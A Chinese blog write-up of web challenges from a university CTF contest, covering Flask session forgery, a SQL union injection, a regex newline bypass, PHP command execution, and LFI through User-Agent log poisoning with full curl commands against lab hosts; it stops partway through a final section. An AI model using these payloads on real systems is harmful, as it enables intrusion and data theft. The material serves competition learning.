itemprop="url">学习study</a></span><span class="article-meta tags"><a class="article-meta__tags" href="/tags/WP/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>WP</span></a></span></div></div><h1 class="post-title" itemprop="name headline">sqctf-web  商丘师范学院第四届网络安全及信息对抗大赛</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2025-04-07T07:07:04.548Z" title="发表于 2025-04-07 15:07:04">2025-04-07</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2026-03-24T06:11:27.322Z" title="更新于 2026-03-24 14:11:27">2026-03-24</time></span></div><div class="meta-secondline"><span class="post-meta-separator"></span><span class="post-meta-pv-cv" id="" data-flag-title="sqctf-web  商丘师范学院第四届网络安全及信息对抗大赛"><i class="anzhiyufont anzhiyu-icon-fw-eye post-meta-icon"></i><span class="post-meta-label" title="阅读量">阅读量:</span><span id="busuanzi_value_page_pv"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></span><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为海南"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>海南</span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src="https://flyfish567.oss-cn-shenzhen.aliyuncs.com/web.img373f68957c1a6b90f5f394cf59c2dfed395143382.jpg?_r_=9d49968b-f17c-2e1f-2bc2-9968c0b4b0e4"></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container" itemscope itemtype="https://flyfish567.github.io/article/%E5%AD%A6%E4%B9%A0study/WP/%E5%95%86%E4%B8%98%E5%B8%88%E8%8C%83%E5%AD%A6%E9%99%A2%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8F%8A%E4%BF%A1%E6%81%AF%E5%AF%B9%E6%8A%97%E5%A4%A7%E8%B5%9B/"><header><a class="post-meta-categories" href="/categories/%E5%AD%A6%E4%B9%A0study/" itemprop="url">学习study</a><a href="/tags/WP/" tabindex="-1" itemprop="url">WP</a><h1 id="CrawlerTitle" itemprop="name headline">sqctf-web  商丘师范学院第四届网络安全及信息对抗大赛</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">FLYFISH</span><time itemprop="dateCreated datePublished" datetime="2025-04-07T07:07:04.548Z" title="发表于 2025-04-07 15:07:04">2025-04-07</time><time itemprop="dateCreated datePublished" datetime="2026-03-24T06:11:27.322Z" title="更新于 2026-03-24 14:11:27">2026-03-24</time></header><h3 id="RceMe（未完成）"><a href="#RceMe（未完成）" class="headerlink" title="RceMe（未完成）"></a>RceMe（未完成）</h3><h3 id="ezGame"><a href="#ezGame" class="headerlink" title="ezGame"></a>ezGame</h3><h5 id="思路"><a href="#思路" class="headerlink" title="思路:"></a>思路:</h5><p><del>这题本来只是单纯的想玩一下游戏，失败的时候自动跳flag了，然后才到源码里仔细看</del></p>
+<p>当游戏结束时，弹出提示框告知玩家游戏结束，然后向服务器发送一个包含当前游戏得分的 <code>GET</code> 请求，请求服务器端的 <code>flag.php</code> 脚本，最后将服务器返回的响应文本以警告框的形式显示给玩家。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (obj.<span class="title function_ invoke__">isGameOver</span>()) &#123; </span><br><span class="line">    	  <span class="comment">//调用 obj 对象的 isGameOver 方法来判断游戏是否结束。若该方法返回 true，则表示游戏结束，会执行大括号内的代码；若返回 false，则不执行。</span></span><br><span class="line">    	  <span class="comment">//游戏失败</span></span><br><span class="line">          <span class="comment">//$(&quot;game&quot;).style.display = &quot;block&quot;;</span></span><br><span class="line">          <span class="comment">//$(&quot;gameover&quot;).style.display = &quot;block&quot;;</span></span><br><span class="line">          <span class="comment">//$(&quot;Score&quot;).innerHTML = &quot;GAME OVER!&lt;br&gt;Score:&quot; + obj.score;</span></span><br><span class="line">          <span class="comment">//console.log(&quot;gameover&quot;);</span></span><br><span class="line">	<span class="title function_ invoke__">alert</span>(<span class="string">&#x27;Game over！&#x27;</span>);</span><br><span class="line">    <span class="comment">//当游戏结束时，弹出一个警告框，显示 Game over！ 这样的提示信息，告知玩家游戏已结束。</span></span><br><span class="line">	obj.<span class="title function_ invoke__">getFlag</span>();</span><br><span class="line">    <span class="comment">//调用 obj 对象的 getFlag 方法，该方法用于向服务器发送请求以获取游戏标志（flag）。</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,     </span><br><span class="line"></span><br><span class="line">getFlag: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> req = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>;</span><br><span class="line">        req.<span class="title function_ invoke__">open</span>(<span class="string">&quot;GET&quot;</span>,<span class="string">&quot;flag.php?score=&quot;</span>+obj.score,<span class="literal">true</span>);</span><br><span class="line">        req.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="title function_ invoke__">alert</span>(this.responseText);</span><br><span class="line">            &#125;</span><br><span class="line">        req.<span class="title function_ invoke__">send</span>();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>但是这里我们不知道flag.php的内容是什么，所以访问一下flag,php，发现直接提示了<code>分数不足！达到2048分即可活动flag</code>，所以玩到2048就可以了</p>
+<p><del>好吧，又尝试了一下，没到2048也会有提示（前端改不行）</del></p>
+<h3 id="伪装（未修改）"><a href="#伪装（未修改）" class="headerlink" title="伪装（未修改）"></a>伪装（未修改）</h3><p>🔍 <strong>代码分析</strong></p>
+<p><strong>1. 核心路由逻辑</strong></p>
+<ul>
+<li><p><strong><code>/</code> 路由</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">@app.route(&#x27;/&#x27;)</span><br><span class="line">def index():</span><br><span class="line">    session[&#x27;role&#x27;] = &#123;&#x27;is_admin&#x27;: 0, &#x27;name&#x27;: &#x27;aiyamaya&#x27;&#125;  # 强制覆盖 session，设置普通用户权限</span><br><span class="line">    return open(__file__).read()                           # 直接泄露源代码，暴露 secret_key</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>暴露密钥</strong>：访问 <code>/</code> 会返回源码，导致 <code>secret_key = &#39;love&#39;</code> 泄露。</li>
+<li><strong>Session 覆盖</strong>：每次访问 <code>/</code> 会重置 <code>role</code> 为普通用户，应避免在此阶段操作。</li>
+</ul>
+</li>
+<li><p><strong><code>/admin</code> 路由</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">@app.route(&#x27;/admin&#x27;)</span><br><span class="line">def admin_handler():</span><br><span class="line">    role = session.get(&#x27;role&#x27;)</span><br><span class="line">    if role.get(&#x27;is_admin&#x27;) == 1 and role.get(&#x27;name&#x27;) == &#x27;sjx&#x27;:</span><br><span class="line">        return render_template_string(&quot;Oh, You get me! The flag is: %s&quot; % os.popen(&quot;cat /flag&quot;).read())</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>权限校验目标</strong>：只有 <code>role=&#123;&#39;is_admin&#39;: 1, &#39;name&#39;: &#39;sjx&#39;&#125;</code> 能触发 flag 返回。</li>
+</ul>
+</li>
+</ul>
+<hr>
+<p>🎯 <strong>攻击思路</strong></p>
+<p><strong>利用 Flask Session 伪造漏洞</strong></p>
+<ol>
+<li><strong>密钥泄露</strong>：通过访问 <code>/</code> 得知 <code>secret_key = &#39;love&#39;</code>。</li>
+<li><strong>构造恶意 Session</strong>：生成包含 <code>role=&#123;&#39;is_admin&#39;: 1, &#39;name&#39;: &#39;sjx&#39;&#125;</code> 的合法 Cookie。</li>
+<li><strong>绕过权限检查</strong>：携带伪造的 Cookie 访问 <code>/admin</code>，触发 flag 逻辑。</li>
+</ol>
+<h3 id="Ping（未完成）"><a href="#Ping（未完成）" class="headerlink" title="Ping（未完成）"></a>Ping（未完成）</h3><h3 id="Are-you-from-SQNU-（未完成）"><a href="#Are-you-from-SQNU-（未完成）" class="headerlink" title="Are you from SQNU?（未完成）"></a>Are you from SQNU?（未完成）</h3><h3 id="Through"><a href="#Through" class="headerlink" title="Through"></a>Through</h3><p>这里因为题目刷的不多，第一遍写的时候没有想起来是什么知识点。</p>
+<p>第二次写注意到题目目录遍历，才反应过来</p>
+<p>然后就用FUZZ一把梭了</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://flyfish567.oss-cn-shenzhen.aliyuncs.com/web.imgimage-20250410171551099.png" alt="image-20250410171551099"></p>
+<h3 id="Look-for-the-homepage"><a href="#Look-for-the-homepage" class="headerlink" title="Look for the homepage"></a>Look for the homepage</h3><p><strong>Level1绕过：</strong></p>
+<ul>
+<li>利用条件 <code>$pass2 === &quot;welcome&quot;</code>，设置GET参数 <code>pass2=welcome</code>，其他参数 <code>pass1</code> 和 <code>verify</code> 可为任意值。</li>
+</ul>
+<p><strong>Level2绕过：</strong></p>
+<ul>
+<li>构造POST参数 <code>value1</code> 和GET参数 <code>value3</code>，使得 <code>$a[&#39;fly&#39;]</code> 等于 <code>md5($value3)</code>。例如，选择 <code>value3=a</code>，其MD5为 <code>0cc175b9c0f1b6a831c399e269772661</code>，设置 <code>value1=fly=0cc175b9c0f1b6a831c399e269772661</code>。</li>
+</ul>
+<p><code>payload：http://challenge.qsnctf.com:31728/challenge.php/?pass1=1&amp;pass2=welcome&amp;verify=2&amp;value3=a</code></p>
+<p><code>value1=fly=0cc175b9c0f1b6a831c399e269772661</code></p>
+<h3 id="商师一日游"><a href="#商师一日游" class="headerlink" title="商师一日游"></a>商师一日游</h3><p><del>商师好好看，比我破大专好多了o(╥﹏╥)o</del></p>
+<h4 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a><strong>第一关</strong></h4><p>提示<code>source</code>，直接直接看源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--苦苦找寻, 在附近的草丛中发现的你的令牌,</span><br><span class="line">       你成功进入校园 ===&gt;  /atc2cnzd.php</span><br><span class="line">       旅行碎片1: sqctf&#123;--&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a><strong>第二关</strong></h4><p><code>打开你的终端，构造一块fish牌的曲奇饼，上面刻下strong字样，便可获得强筋壮骨牌鱼食曲奇</code><del>曲奇？Cookie!</del> 根据提示查看Cookie，发现里面的<code>fish=weak</code>改成<code>strong</code>就可以了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">旅行碎片2: d776</span><br><span class="line">你继续前进 ===&gt; /atc3oklm.php</span><br></pre></td></tr></table></figure>
+
+<h4 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a><strong>第三关</strong></h4><p>提示<code>进入终端，在devtool中找到复活币</code></p>
+<p><del>这里刚开始在源码和js里找（找错了）</del></p>
+<p><del>devtools?是什么，刚开始不知道所以这里问ai了，刚刚搜了发现是开发工具</del></p>
+<h5 id="为什么用curl-V？"><a href="#为什么用curl-V？" class="headerlink" title="为什么用curl -V？"></a><strong>为什么用<code>curl -V</code></strong>？</h5><p>（以下是deepseek R1的理由）</p>
+<ul>
+<li><p>复活币是<strong>服务器返回的隐藏数据</strong>，而非页面可见内容</p>
+</li>
+<li><p>它可能存在于：</p>
+<ul>
+<li><strong>HTTP 响应头</strong>（如 <code>X-Flag</code>、<code>X-Token</code> 等自定义头）</li>
+<li><strong>HTML 注释</strong>（开发者工具中可见但页面不渲染）</li>
+<li><strong>JS&#x2F;CSS 文件</strong>（代码中硬编码的字符串）</li>
+<li><strong>网络请求的元数据</strong>（如 Cookie、重定向路径）</li>
+<li><strong>操作路径的逻辑</strong><br>根据提示的指引，解题流程应为：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">打开开发者工具 → 定位网络请求 → 分析请求/响应 → 提取复活币</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p>这里在html和js还有cookie都找过了，没有内容，所以才选择在http响应中寻找</p>
+<p><code>curl -v</code> 的 verbose 模式会显示 <strong>完整的 HTTP 交互过程</strong>，包括：</p>
+<ol>
+<li><strong>请求头 (Request Headers)</strong><br>可确认是否携带了必要的参数或 Cookie</li>
+<li><strong>响应头 (Response Headers)</strong><br>直接暴露服务器返回的元数据（如复活币的位置）</li>
+<li><strong>调试信息</strong><br>例如 302 重定向路径、认证失败提示等</li>
+</ol>
+<p>所以使用命令<code>curl -v http://challenge.qsnctf.com:30868/atc3oklm.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">回显</span><br><span class="line">&lt; HTTP/<span class="number">1.1</span> <span class="number">200</span> OK</span><br><span class="line">&lt; Date: Mon, <span class="number">07</span> Apr <span class="number">2025</span> <span class="number">11</span>:<span class="number">30</span>:<span class="number">59</span> GMT</span><br><span class="line">&lt; Server: Apache/<span class="number">2.4</span>.<span class="number">25</span> (Debian)</span><br><span class="line">&lt; X-Powered-By: PHP/<span class="number">5.6</span>.<span class="number">40</span></span><br><span class="line">&lt; Revival: <span class="literal">true</span></span><br><span class="line">&lt; Tourist_fragment3: <span class="number">3349</span>f6 <span class="comment">//flag</span></span><br><span class="line">&lt; Information: Let<span class="string">&#x27;s fight again ===&gt; /atc4zztg.php  //下一关</span></span><br><span class="line"><span class="string">&lt; Vary: Accept-Encoding</span></span><br><span class="line"><span class="string">&lt; Content-Length: 2288</span></span><br><span class="line"><span class="string">&lt; Content-Type: text/html; charset=UTF-8</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h4><p><code>借由终端，找到robots.txt，从而获得超强jumping power，拿到纸条</code></p>
+<p><del>?jumping 姜萍！</del></p>
+<p>这里根据提示查看robots.txt文件就行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">url:http://challenge.qsnctf.com:30868/robots.txt</span><br><span class="line">You get the note, which reads:</span><br><span class="line">&quot;Thank you for your help, let me save you some time for the rest of your journey&quot;</span><br><span class="line"></span><br><span class="line">Suddenly, the note unfolds a portal, and you are sucked in and out of sight</span><br><span class="line"></span><br><span class="line">Tourist fragment4: ee43ebb</span><br><span class="line"></span><br><span class="line">Next location ===&gt; /atc5uupl.php</span><br></pre></td></tr></table></figure>
+
+<h4 id="第五关"><a href="#第五关" class="headerlink" title="第五关"></a><strong>第五关</strong></h4><p>正则，大概吧。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">		<span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;hhh&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^php$/im&#x27;</span>, <span class="variable">$a</span>))&#123; </span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^php$/i&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;hacker&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> xxxxxxxxxxx;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;nonononono&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//第一层校验 /^php$/im</span></span><br><span class="line">修饰符 m（多行模式）</span><br><span class="line">使 ^ 和 $ 匹配字符串中每一行的开头和结尾（而非整个字符串的开头和结尾）。</span><br><span class="line">修饰符 i（忽略大小写）</span><br><span class="line">匹配时不区分大小写（如 PHP、PhP 均符合）。</span><br><span class="line"><span class="keyword">if</span>条件：</span><br><span class="line">如果输入字符串中存在至少一行完全等于 php（不区分大小写），那么进入下一层判断；否则结束</span><br><span class="line"></span><br><span class="line"><span class="comment">//第二层校验 /^php$/i</span></span><br><span class="line">无 m 修饰符</span><br><span class="line">^ 和 $ 仅匹配整个字符串的开头和结尾。</span><br><span class="line">修饰符 i 仍生效</span><br><span class="line">忽略大小写。</span><br><span class="line"><span class="keyword">if</span>条件：</span><br><span class="line">如果整个输入字符串严格等于 php（不区分大小写，且无额外字符或换行），那么输出hacker，否则输出xxxxxxxxxxx;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><strong>绕过思路</strong></p>
+<p>根据上面的分析，我们需要第一个判断返回true，第二个判断返回false。</p>
+<p>可以用<code>php%0A（换行符的url编码）+任意内容</code>，满足获得输出的条件</p>
+<ul>
+<li><strong>换行符注入</strong><br><code>php%0A123</code>、<code>php%0D%0A</code>123（Windows 换行）、<code>php\n</code>（直接写入）。</li>
+<li><strong>多行组合</strong><br><code>abc%0Aphp%0Adef</code>（第二行匹配 <code>php</code>）。</li>
+</ul>
+<p><del>我这里选了第一种<code>?hhh=php%0A123</code></del></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">获得回显</span><br><span class="line">成功消灭逸散漏洞</span><br><span class="line">旅行碎片<span class="number">5</span>: <span class="number">01e78</span>a3d</span><br><span class="line">你继续前进 ===&gt; /atc6ertg.php</span><br></pre></td></tr></table></figure>
+
+<h4 id="第六关"><a href="#第六关" class="headerlink" title="第六关"></a>第六关</h4><p><del>？我怎么不点，不让我点</del></p>
+<p>所以只要点击按钮就可以了，根据网页基础知识，可以去掉这里</p>
+<p><code>&lt;input disabled type=&quot;submit&quot; value=&quot;Hidden Levels&quot; name=&quot;auth&quot; style=&quot; height: 50px&quot;&gt;</code>的<code>disabled</code>就可以按按钮了</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">验证成功, 欢迎来到隐藏关卡: 继续前进  <span class="comment">//点击这里</span></span><br><span class="line">别忘了收集旅行碎片<span class="number">6</span>: efaa2</span><br></pre></td></tr></table></figure>
+
+<p><strong>第七关</strong></p>
+<p>恭喜恭喜</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://flyfish567.oss-cn-shenzhen.aliyuncs.com/web.imgimage-20250407203123125.png" alt="image-20250407203123125"></p>
+<p>这里直接post查看就行，考的是命令执行,直接看目录，再检查就行</p>
+<p><code>memory=system(&#39;ls&#39;);</code></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://flyfish567.oss-cn-shenzhen.aliyuncs.com/web.imgimage-20250407203314954.png" alt="image-20250407203314954"></p>
+<p><code>memory=system(&#39;tac Tourist_fragment7&#39;);</code></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://flyfish567.oss-cn-shenzhen.aliyuncs.com/web.imgimage-20250407203444312.png" alt="image-20250407203444312"></p>
+<p>结束啦，恭喜恭喜，<del>其他题目不会写了，先这样吧</del></p>
+<h3 id="小小查询系统"><a href="#小小查询系统" class="headerlink" title="小小查询系统"></a>小小查询系统</h3><p><del>学了许久的sql注入终于碰到了</del></p>
+<p>发现可以正常联合查询，那就联合查询，单引号闭合</p>
+<p>这里有点思维惯性了，认为flag一定在当前库下面，所以一直查下去，发现没有。以为是自己搞错了，后来反应过来，可能在其他库下面。成功找到了ctf库，flag名，id,value列名，但是这里在查询数据的时候，显示flag库不存在，<del>？why，，why，baby，why</del>，思索许久，选择了询问恩师deepseek，才了解到，数据库查询数据是从当前数据库查的，如果当前数据库没有查询的表，那么就会回显，不存在flag库，所以最后查询是<code>?id=-1&#39; union select 1,2,(select group_concat(id,&#39;~&#39;,value) from ctf.flag) %23 </code>，这题又学到了知识点，(^o^)&#x2F;~</p>
+<h3 id="baby-include"><a href="#baby-include" class="headerlink" title="baby_include"></a>baby_include</h3><p><del>这题wp参考了deepseek rensoner</del></p>
+<h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a><strong>漏洞分析</strong></h4><p><strong>1. 漏洞类型</strong></p>
+<ul>
+<li><strong>本地文件包含（LFI）</strong>：题目代码中存在 <code>include($look)</code> 操作，且参数 <code>look</code> 未严格限制协议和路径，导致可读取任意本地文件。</li>
+<li><strong>过滤不严</strong>：仅对 <code>php</code>、<code>data</code>、<code>filter</code>、<code>input</code> 等关键词进行替换，未禁用 <code>file://</code> 协议或彻底限制文件范围。</li>
+</ul>
+<p><strong>2. 漏洞触发点</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include($look);  // 直接包含用户输入的 $look 参数</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>用户通过 <code>?look=xxx</code> 可控制包含的文件路径。</li>
+<li>若包含的文件中存在 PHP 代码（如日志文件），会被解析执行。</li>
+</ul>
+<p><strong>3. 过滤规则缺陷</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// 替换关键词为 !!!</span><br><span class="line">$look = str_replace(&quot;php&quot;, &quot;!!!&quot;, $look);  </span><br><span class="line">$look = str_replace(&quot;data&quot;, &quot;!!!&quot;, $look);</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>仅替换部分协议关键词，未禁用 <code>file://</code> 协议。</li>
+<li>未对文件路径做白名单限制（如仅允许包含特定目录）。</li>
+</ul>
+<hr>
+<h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a><strong>思路</strong></h4><p><strong>核心逻辑</strong></p>
+<ol>
+<li><strong>目标</strong>：读取 <code>/var/www/html/flag.php</code>（Flag 文件）。</li>
+<li><strong>限制</strong>：无法直接使用 <code>php://filter</code> 或 <code>data://</code> 协议读取文件源码。</li>
+<li>替代方案<ul>
+<li><strong>利用日志文件</strong>：通过 <code>file://</code> 协议包含服务器日志文件（如 Nginx 的 <code>access.log</code>）。</li>
+<li><strong>污染日志</strong>：注入 PHP 代码到日志中，使其成为可执行的“恶意文件”。</li>
+</ul>
+</li>
+</ol>
+<p><strong>攻击步骤</strong></p>
+<ol>
+<li><strong>污染日志</strong>：发送携带恶意 <code>User-Agent</code> 的 HTTP 请求，将 PHP 代码写入日志。</li>
+<li><strong>触发执行</strong>：通过 LFI 包含日志文件，触发代码执行，读取 Flag。</li>
+</ol>
+<hr>
+<h4 id="绕过原理"><a href="#绕过原理" class="headerlink" title="绕过原理"></a><strong>绕过原理</strong></h4><p><strong>1. 绕过协议过滤</strong></p>
+<ul>
+<li><p><strong>过滤规则</strong>：<code>php</code>、<code>data</code>、<code>filter</code>、<code>input</code> 被替换为 <code>!!!</code>。</p>
+</li>
+<li><p><strong>可用协议</strong>：<code>file://</code> 未被过滤，可直接使用。</p>
+</li>
+<li><p>关键操作</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl &quot;http://目标/?look=file:///var/log/nginx/access.log&quot;</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p><strong>2. 日志文件作为 PHP 代码载体</strong></p>
+<ul>
+<li><p><strong>日志记录机制</strong>：服务器会将请求头信息（如 <code>User-Agent</code>）记录到日志文件中。</p>
+</li>
+<li><p>代码注入通过<code>User-Agent</code>注入 PHP 代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -A &quot;&lt;?php system(&#x27;cat /flag&#x27;); ?&gt;&quot; http://目标</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>日志污染结果：</p>
+</li>
+<li><p>日志中会包含一行如下内容：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 - - [时间戳] &quot;GET / HTTP/1.1&quot; 200 ... &quot;&lt;?php system(&#x27;cat /flag&#x27;); ?&gt;&quot;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>代码执行</strong>：当通过 <code>include()</code> 包含日志文件时，其中的 PHP 代码会被解析执行。</p>
+</li>
+</ul>
+<p><strong>3. 路径猜测依据</strong></p>
+<ul>
+<li>日志路径<ul>
+<li>Nginx 默认日志路径：<code>/var/log/nginx/access.log</code>。</li>
+<li>Apache 默认日志路径：<code>/var/log/apache2/access.log</code>。</li>
+<li>CTF 题目通常使用默认路径。</li>
+</ul>
+</li>
+<li>Flag 路径<ul>
+<li>Web 根目录惯例：<code>/var/www/html</code>。</li>
+<li>常见 Flag 文件名：<code>flag.php</code>、<code>flag.txt</code>、<code>/flag</code>。</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h4 id="绕过方案"><a href="#绕过方案" class="headerlink" title="绕过方案"></a><strong>绕过方案</strong></h4><p><strong>1. 完整攻击流程</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 步骤1：污染日志（注入 PHP 代码）</span><br><span class="line">curl -A &quot;&lt;?php system(&#x27;cat /var/www/html/flag.php&#x27;); ?&gt;&quot; http://challenge.qsnctf.com:31338/</span><br><span class="line"></span><br><span class="line"># 步骤2：触发文件包含（执行日志中的代码）</span><br><span class="line">curl &quot;http://challenge.qsnctf.com:31338/?look=file:///var/log/nginx/access.log&quot;</span><br></pre></td></tr></table></figure>
+
+<h3 id="input-a-number"><a href="#input-a-number" class="headerlink" title="input a number"></a>input a number</h3><p>此题目wp参考了deepseek reasoner</p>
+<p><code>intval</code><strong>将变量转为整数</strong>：</p>
+<ul>
+<li>对于字符串，会尝试提取开头的数字部分（忽略非数字字符）。</li>
